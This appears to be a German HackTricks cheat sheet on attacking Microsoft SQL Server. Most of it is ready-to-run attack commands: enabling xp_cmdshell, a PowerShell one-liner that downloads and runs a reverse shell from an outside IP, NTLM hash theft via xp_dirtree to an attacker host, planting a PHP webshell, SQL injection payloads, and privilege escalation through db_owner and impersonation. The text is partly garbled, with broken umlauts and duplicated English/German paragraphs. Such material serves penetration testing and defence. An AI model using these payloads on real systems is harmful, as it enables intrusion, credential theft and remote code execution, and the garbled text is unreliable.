# 1433 - Pentesting MSSQL - Microsoft SQL Server

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Grundlegende Informationen

Aus [Wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server):

> **Microsoft SQL Server** ist ein **relationales Datenbankmanagementsystem**, das von Microsoft entwickelt wurde. Als Datenbankserver ist es ein Softwareprodukt mit der Hauptfunktion, Daten zu speichern und abzurufen, wie von anderen Softwareanwendungen angefordert - die entweder auf demselben Computer oder auf einem anderen Computer √ºber ein Netzwerk (einschlie√ülich des Internets) ausgef√ºhrt werden.

**Standardport:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **Standard MS-SQL-Systemtabellen**

* **master-Datenbank**: Diese Datenbank ist entscheidend, da sie alle systemweiten Details f√ºr eine SQL Server-Instanz erfasst.
* **msdb-Datenbank**: Der SQL Server Agent nutzt diese Datenbank zur Verwaltung der Zeitplanung f√ºr Benachrichtigungen und Aufgaben.
* **model-Datenbank**: Dient als Vorlage f√ºr jede neue Datenbank auf der SQL Server-Instanz, wobei alle √Ñnderungen wie Gr√∂√üe, Kollation, Wiederherstellungsmodell und mehr in neu erstellten Datenbanken gespiegelt werden.
* **Resource-Datenbank**: Eine schreibgesch√ºtzte Datenbank, die Systemobjekte enth√§lt, die mit SQL Server geliefert werden. Diese Objekte werden zwar physisch in der Resource-Datenbank gespeichert, sind aber logisch im sys-Schema jeder Datenbank dargestellt.
* **tempdb-Datenbank**: Dient als tempor√§rer Speicherbereich f√ºr vor√ºbergehende Objekte oder Zwischenergebnisse.


## Enumeration

### Automatische Enumeration

Wenn Sie nichts √ºber den Dienst wissen:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
Wenn Sie **keine** **Anmeldeinformationen** haben, k√∂nnen Sie versuchen, sie zu erraten. Sie k√∂nnen nmap oder Metasploit verwenden. Seien Sie vorsichtig, Sie k√∂nnen **Konten blockieren**, wenn Sie sich mehrmals mit einem vorhandenen Benutzernamen falsch anmelden.
{% endhint %}

#### Metasploit (Anmeldeinformationen erforderlich)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute Force**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### Manuelle Aufz√§hlung

#### Anmeldung
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### H√§ufige Enumeration

##### Port Scanning

##### Port-Scannen

Port scanning is the first step in enumerating a Microsoft SQL Server (MSSQL) service. It helps identify open ports and services running on those ports.

Das Port-Scannen ist der erste Schritt bei der Enumeration eines Microsoft SQL Server (MSSQL)-Dienstes. Es hilft dabei, offene Ports und die darauf laufenden Dienste zu identifizieren.

##### Banner Grabbing

##### Banner Grabbing

Banner grabbing involves retrieving information from the MSSQL server's banner or initial response. This can provide valuable details about the server version and other relevant information.

Beim Banner Grabbing wird die Information aus dem Banner oder der initialen Antwort des MSSQL-Servers abgerufen. Dies kann wertvolle Details √ºber die Serverversion und andere relevante Informationen liefern.

##### Service Version Detection

##### Erkennung der Dienstversion

Service version detection involves identifying the specific version of the MSSQL service running on the target system. This information can be useful for finding vulnerabilities specific to that version.

Die Erkennung der Dienstversion beinhaltet die Identifizierung der spezifischen Version des MSSQL-Dienstes, der auf dem Zielsystem l√§uft. Diese Information kann n√ºtzlich sein, um Schwachstellen zu finden, die spezifisch f√ºr diese Version sind.

##### SQL Server Browser Enumeration

##### Enumeration des SQL Server-Browsers

The SQL Server Browser service helps clients locate and connect to named instances of MSSQL on a network. Enumerating this service can provide information about the named instances available on the target system.

Der SQL Server-Browser-Dienst hilft Clients dabei, benannte Instanzen von MSSQL in einem Netzwerk zu finden und eine Verbindung herzustellen. Die Enumeration dieses Dienstes kann Informationen √ºber die verf√ºgbaren benannten Instanzen auf dem Zielsystem liefern.

##### SQL Server Instance Enumeration

##### Enumeration der SQL Server-Instanz

Enumerating the SQL Server instances involves identifying the different instances of MSSQL running on the target system. This can help in targeting specific instances for further enumeration and exploitation.

Die Enumeration der SQL Server-Instanzen beinhaltet die Identifizierung der verschiedenen Instanzen von MSSQL, die auf dem Zielsystem laufen. Dies kann dabei helfen, bestimmte Instanzen f√ºr weitere Enumeration und Ausnutzung zu identifizieren.

##### SQL Server Database Enumeration

##### Enumeration der SQL Server-Datenbank

Enumerating the SQL Server databases involves identifying the databases hosted on the MSSQL server. This can provide valuable information about the data stored on the server and potential targets for further exploitation.

Die Enumeration der SQL Server-Datenbanken beinhaltet die Identifizierung der auf dem MSSQL-Server gehosteten Datenbanken. Dies kann wertvolle Informationen √ºber die auf dem Server gespeicherten Daten und potenzielle Ziele f√ºr weitere Ausnutzung liefern.

##### SQL Server User Enumeration

##### Enumeration der SQL Server-Benutzer

Enumerating the SQL Server users involves identifying the users and their privileges on the MSSQL server. This information can be useful for further exploitation and privilege escalation.

Die Enumeration der SQL Server-Benutzer beinhaltet die Identifizierung der Benutzer und ihrer Privilegien auf dem MSSQL-Server. Diese Informationen k√∂nnen f√ºr weitere Ausnutzung und Privileg-Eskalation n√ºtzlich sein.
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### Benutzer erhalten

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### Berechtigungen abrufen

1. **Sicherbar**: Definiert als die Ressourcen, die von SQL Server zur Zugriffskontrolle verwaltet werden. Diese werden in folgende Kategorien unterteilt:
- **Server** - Beispiele hierf√ºr sind Datenbanken, Logins, Endpunkte, Verf√ºgbarkeitsgruppen und Serverrollen.
- **Datenbank** - Beispiele umfassen Datenbankrollen, Anwendungsrollen, Schemata, Zertifikate, Volltextkataloge und Benutzer.
- **Schema** - Enth√§lt Tabellen, Ansichten, Prozeduren, Funktionen, Synonyme usw.

2. **Berechtigung**: Mit SQL Server-Sicherbaren verbundene Berechtigungen wie ALTER, CONTROL und CREATE k√∂nnen einem Prinzipal gew√§hrt werden. Die Verwaltung von Berechtigungen erfolgt auf zwei Ebenen:
- **Serverebene** mit Logins
- **Datenbankebene** mit Benutzern

3. **Prinzipal**: Dieser Begriff bezieht sich auf die Entit√§t, der Berechtigungen f√ºr ein Sicherbares gew√§hrt werden. Prinzipale umfassen haupts√§chlich Logins und Datenbankbenutzer. Die Kontrolle √ºber den Zugriff auf Sicherbare erfolgt durch das Gew√§hren oder Verweigern von Berechtigungen oder durch das Einbeziehen von Logins und Benutzern in Rollen mit Zugriffsrechten.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## Tricks

### Ausf√ºhren von Betriebssystembefehlen

{% hint style="danger" %}
Beachten Sie, dass es nicht nur erforderlich ist, **`xp_cmdshell`** **aktiviert** zu haben, um Befehle ausf√ºhren zu k√∂nnen, sondern auch die **AUSF√úHREN-Berechtigung f√ºr die gespeicherte Prozedur `xp_cmdshell`** zu besitzen. Sie k√∂nnen herausfinden, wer (au√üer Sysadmins) **`xp_cmdshell`** verwenden kann, indem Sie Folgendes verwenden:
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' ‚Äî
```
### NetNTLM-Hash stehlen / Relay-Angriff

Sie sollten einen **SMB-Server** starten, um den bei der Authentifizierung verwendeten Hash abzufangen (`impacket-smbserver` oder `responder` zum Beispiel).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
Sie k√∂nnen √ºberpr√ºfen, wer (au√üer den Systemadministratoren) Berechtigungen zum Ausf√ºhren dieser MSSQL-Funktionen hat, indem Sie Folgendes tun:
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

Mit Tools wie **responder** oder **Inveigh** ist es m√∂glich, den NetNTLM-Hash zu stehlen.\
Sie k√∂nnen sehen, wie man diese Tools verwendet in:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Missbrauch von MSSQL Trusted Links

[**Lesen Sie diesen Beitrag**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **um weitere Informationen dar√ºber zu finden, wie man diese Funktion missbraucht:**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **Dateien schreiben**

Um Dateien mit `MSSQL` zu schreiben, m√ºssen wir [**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) aktivieren, was Administratorrechte erfordert, und dann einige gespeicherte Prozeduren ausf√ºhren, um die Datei zu erstellen:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Datei mit** OPENROWSET **lesen**

Standardm√§√üig erlaubt `MSSQL` das Lesen von Dateien auf dem Betriebssystem, f√ºr die das Konto Lesezugriff hat. Wir k√∂nnen die folgende SQL-Abfrage verwenden:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Jedoch erfordert die **`BULK`**-Option die Berechtigung **`ADMINISTER BULK OPERATIONS`** oder **`ADMINISTER DATABASE BULK OPERATIONS`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### Fehlerbasierter Vektor f√ºr SQLi:

```sql
SELECT column_name FROM table_name WHERE 1=convert(int,(select top 1 column_name from table_name)))
```

This error-based vector for SQL injection is used to extract data from a Microsoft SQL Server database. It leverages the `convert` function to force a conversion error and reveal information.

To use this vector, replace `column_name` with the name of the column you want to extract data from, and `table_name` with the name of the table containing the desired data.

The `select top 1` statement is used to retrieve only one record from the specified column. If the injection is successful, the converted value will cause an error, and the error message will contain the extracted data.

Keep in mind that this technique may not work in all scenarios, as it relies on the specific error messages generated by the SQL Server. Additionally, it is important to note that SQL injection is illegal and should only be performed with proper authorization and for legitimate purposes, such as penetration testing.
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Dateien lesen und Skripte ausf√ºhren (Python und R)**

MSSQL erm√∂glicht es Ihnen, Skripte in **Python und/oder R** auszuf√ºhren. Dieser Code wird von einem **anderen Benutzer** als demjenigen ausgef√ºhrt, der **xp\_cmdshell** verwendet, um Befehle auszuf√ºhren.

Beispiel, um ein **'R'** _"Hallo Welt!"_ **nicht funktioniert** auszuf√ºhren:

![](<../../.gitbook/assets/image (185) (1).png>)

Beispiel f√ºr die Verwendung von konfiguriertem Python, um mehrere Aktionen auszuf√ºhren:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Registrierung lesen

Microsoft SQL Server bietet **mehrere erweiterte gespeicherte Prozeduren**, mit denen Sie nicht nur mit dem Netzwerk, sondern auch mit dem Dateisystem und sogar der [**Windows-Registrierung**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/) interagieren k√∂nnen:

| **Regul√§r**                  | **Instanzbezogen**                     |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
F√ºr **weitere Beispiele** schauen Sie sich die [**urspr√ºngliche Quelle**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/) an.

### RCE mit MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Es ist m√∂glich, eine .NET-DLL innerhalb von MSSQL mit benutzerdefinierten Funktionen zu **laden**. Dies erfordert jedoch den Zugriff auf `dbo`, daher ben√∂tigen Sie eine Verbindung zur Datenbank **als `sa` oder mit einer Administratorrolle**.

[Folgen Sie diesem Link](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp), um ein Beispiel zu sehen.

### Andere M√∂glichkeiten f√ºr RCE

Es gibt andere Methoden, um die Befehlsausf√ºhrung zu erhalten, wie z.B. das Hinzuf√ºgen von [erweiterten gespeicherten Prozeduren](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR-Assemblys](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) und [externen Skripten](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitsl√ºcken, damit Sie sie schneller beheben k√∂nnen. Intruder verfolgt Ihre Angriffsfl√§che, f√ºhrt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs √ºber Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MSSQL Privilege Escalation

### Von db\_owner zu sysadmin

Wenn einem **normalen Benutzer** die Rolle **`db_owner`** √ºber die **Datenbank eines Administrator**-Benutzers (wie **`sa`**) gegeben wird und diese Datenbank als **`trustworthy`** konfiguriert ist, kann dieser Benutzer diese Privilegien missbrauchen, um **Privilege Escalation** durchzuf√ºhren, da in dieser Datenbank gespeicherte Prozeduren als Eigent√ºmer (**Administrator**) ausgef√ºhrt werden k√∂nnen.
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Sie k√∂nnen ein **Metasploit**-Modul verwenden:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Oder ein **PS**-Skript:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Impersonation anderer Benutzer

SQL Server verf√ºgt √ºber eine spezielle Berechtigung namens **`IMPERSONATE`**, die es dem ausf√ºhrenden Benutzer erm√∂glicht, die Berechtigungen eines anderen Benutzers oder Logins anzunehmen, bis der Kontext zur√ºckgesetzt oder die Sitzung beendet wird.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
Wenn Sie sich als Benutzer ausgeben k√∂nnen, auch wenn er kein Sysadmin ist, sollten Sie √ºberpr√ºfen, **ob der Benutzer Zugriff** auf andere **Datenbanken** oder verkn√ºpfte Server hat.
{% endhint %}

Beachten Sie, dass Sie, sobald Sie Sysadmin sind, sich als jeden anderen ausgeben k√∂nnen:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Sie k√∂nnen diesen Angriff mit einem **Metasploit**-Modul durchf√ºhren:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
oder mit einem **PS**-Skript:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Verwendung von MSSQL f√ºr Persistenz

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## Extrahieren von Passw√∂rtern aus SQL Server Linked Servers
Ein Angreifer kann Passw√∂rter von SQL Server Linked Servers aus den SQL-Instanzen extrahieren und sie im Klartext erhalten, wodurch dem Angreifer Passw√∂rter zur Verf√ºgung stehen, die verwendet werden k√∂nnen, um eine gr√∂√üere Verankerung im Ziel zu erreichen.
Das Skript zum Extrahieren und Entschl√ºsseln der f√ºr die Linked Servers gespeicherten Passw√∂rter finden Sie [hier](https://www.richardswinbank.net/admin/extract_linked_server_passwords).

F√ºr diesen Angriff m√ºssen einige Anforderungen und Konfigurationen erf√ºllt sein.
Zun√§chst m√ºssen Sie Administratorrechte auf der Maschine haben oder die M√∂glichkeit haben, die SQL Server-Konfigurationen zu verwalten.

Nachdem Sie Ihre Berechtigungen √ºberpr√ºft haben, m√ºssen Sie drei Dinge konfigurieren:
1. Aktivieren Sie TCP/IP auf den SQL Server-Instanzen.
2. F√ºgen Sie einen Startparameter hinzu, in diesem Fall wird eine Trace-Flagge hinzugef√ºgt, n√§mlich -T7806.
3. Aktivieren Sie die Remote-Verwaltungsverbindung.

Um diese Konfigurationen zu automatisieren, enth√§lt [dieses Repository](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) die ben√∂tigten Skripte.
Neben einem PowerShell-Skript f√ºr jeden Schritt der Konfiguration enth√§lt das Repository auch ein vollst√§ndiges Skript, das die Konfigurationsskripte sowie die Extraktion und Entschl√ºsselung der Passw√∂rter kombiniert.

Weitere Informationen zu diesem Angriff finden Sie unter den folgenden Links:
[Entschl√ºsselung von MSSQL Database Link Server-Passw√∂rtern](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Beheben von Problemen mit der SQL Server Dedicated Administrator Connection](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Lokale Privilege-Eskalation

Der Benutzer, der den MSSQL-Server ausf√ºhrt, hat das Berechtigungstoken **SeImpersonatePrivilege** aktiviert.
Sie k√∂nnen wahrscheinlich zu **Administrator** eskalieren, indem Sie einer dieser 2 Seiten folgen:

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## Referenzen

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
* [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
